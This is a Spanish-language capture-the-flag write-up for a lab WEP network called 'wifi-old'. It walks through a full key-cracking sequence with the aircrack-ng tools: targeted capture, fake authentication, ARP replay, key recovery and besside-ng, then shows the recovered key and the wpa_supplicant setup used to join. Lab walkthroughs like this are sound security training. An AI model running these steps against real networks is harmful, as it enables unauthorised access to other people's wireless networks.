# Challenges WEP

En este capítulo vamos a realizar el siguiente reto:

* Challenge 7 ¿Cuál es la flag en la web del AP wifi-old?

***

## Challenge 7

* ¿Cuál es la flag en la web del AP wifi-old?

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Vemos que su puertos es el `3` y la MAC BSSID es `F0:9F:C2:71:22:11`

Ahora con `airodump-ng` hacemos un escaneo especifico

```
airodump-ng wlan0 --manufacturer --band bag -c3 --bssid F0:9F:C2:71:22:11 -w wifi-old
```

Con esto podemos ver que esa red solo tiene un usuario dentro.

## Attacks

### Autentificación False

Ahora desde otra terminal mientras corre `airodump-ng`, realizamos una autentificación falsa con `aireplay-ng` -->

```
aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan0
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Con esto dede el propio `airodump-ng` vemos a nuestra interfaz haciendo la falsa conexion con la wifi -->

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora desde otra terminal, hacemos el atque de envio ARP con `aireplay-ng` -->

```
aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h 02:00:00:00:00:00 wlan0
```

Por ultimo, desde otra terminal, lanzamos `aircrack-ng` especificando el BSSID y el archivo .cap de trafico que esta capturando `airodump-ng` -->

```
aircrack-ng wifi-old-01.cap -b F0:9F:C2:71:22:11
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

### Besside-ng

Esta es una herramienta automatica y solo hace falta especificar el canal y el BSSID -->

```
besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan0
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`11:bb:33:cd:55`

***

## Wpa-supplicant Conecction

```bash
## Creamos el fichero de wpa_supplicant
nano wep.conf
## Configuracion
network={
        ssid="wifi-old"
        key_mgmt=NONE
        wep_key0=11bb33cd55
        wep_tx_keyidx=0
}
## Conexion wpa_supplicant
wpa_supplicant -i wlan0 -c wep.conf
## Pedimos IP DHCP
dhclient -v wlan0
```

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora acceder al la puerta de enlace 192.168.1.1 -->

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
